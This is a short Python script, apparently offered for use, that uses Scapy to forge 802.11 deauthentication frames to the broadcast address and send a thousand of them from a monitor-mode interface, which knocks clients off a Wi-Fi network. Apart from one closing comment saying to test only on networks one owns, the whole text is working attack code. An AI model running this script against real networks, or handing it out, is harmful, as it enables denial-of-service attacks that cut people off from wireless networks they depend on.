from scapy.all import *

destination_mac = "ff:ff:ff:ff:ff:ff" #AP/ receiver
gateway_mac = "paste-your-mac-here" #Attacker

deauthp = Dot11(addr1=destination_mac, addr2=gateway_mac, addr3=gateway_mac)

packet = RadioTap()/deauthp/Dot11Deauth(reason=7)

sendp(packet, inter=0.1, count=1000, iface="wlan0mon", verbose=1)

# Run this as monitor
# Only test on network setups you own
